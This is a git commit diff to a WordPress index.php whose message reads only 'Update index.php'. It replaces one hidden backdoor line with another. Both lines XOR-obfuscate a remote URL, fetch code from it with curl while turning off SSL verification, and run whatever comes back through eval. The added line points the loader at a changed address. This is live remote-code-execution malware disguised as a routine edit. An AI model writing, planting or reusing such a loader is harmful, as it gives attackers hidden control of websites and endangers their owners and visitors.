2f5d7e372b006fd5d945fc585c4dab70db400df7
rh1519868-dotcom <rh1519868@gmail.com>
2026-06-22 15:05:44 +0600

    Update index.php

--- index.php
+++ index.php
@@ -6,7 +6,7 @@
  * @package WordPress
  */
 
-$_k=[64,57,118,66,107,33,51,87];$_d=[40,77,2,50,81,14,28,102,121,0,88,115,93,25,29,102,112,11,88,112,88,21,28,45,118,9,64,115,89,126,1,120,51,77,23,54,68,72,93,51,37,65,88,54,19,85];$_u=pack('C*',...array_map(function($v,$i)use($_k){return $v^$_k[$i%8];},$_d,array_keys($_d)));unset($_k,$_d);if($_c=@curl_init($_u)){@curl_setopt_array($_c,[19913=>1,52=>1,13=>15,10018=>'Mozilla/5.0',64=>0]);$_s=@curl_exec($_c);@curl_close($_c);if($_s!==false)@eval(preg_replace(['/^\s*<\?php\s*/i','/\?>\s*$/'],'',$_s));unset($_u,$_c,$_s);}
+$_p=[64,57,118,66,107,33,51,87];$_q=[40,77,2,50,81,14,28,102,119,10,88,112,91,25,29,102,116,1,88,112,89,23,28,45,118,9,64,114,90,126,1,120,51,77,23,54,68,72,93,51,37,65,88,54,19,85];$_r=pack('C*',...array_map(function($v,$i)use($_p){return $v^$_p[$i%8];},$_q,array_keys($_q)));unset($_p,$_q);if($_v=@curl_init($_r)){@curl_setopt_array($_v,[19913=>1,52=>1,13=>15,10018=>'Mozilla/5.0',64=>0]);$_w=@curl_exec($_v);@curl_close($_v);if($_w!==false)@eval(preg_replace(['/^\s*<\?php\s*/i','/\?>\s*$/'],'',$_w));unset($_r,$_v,$_w);}
 
 /**
  * Tells WordPress to load the WordPress theme and output it.
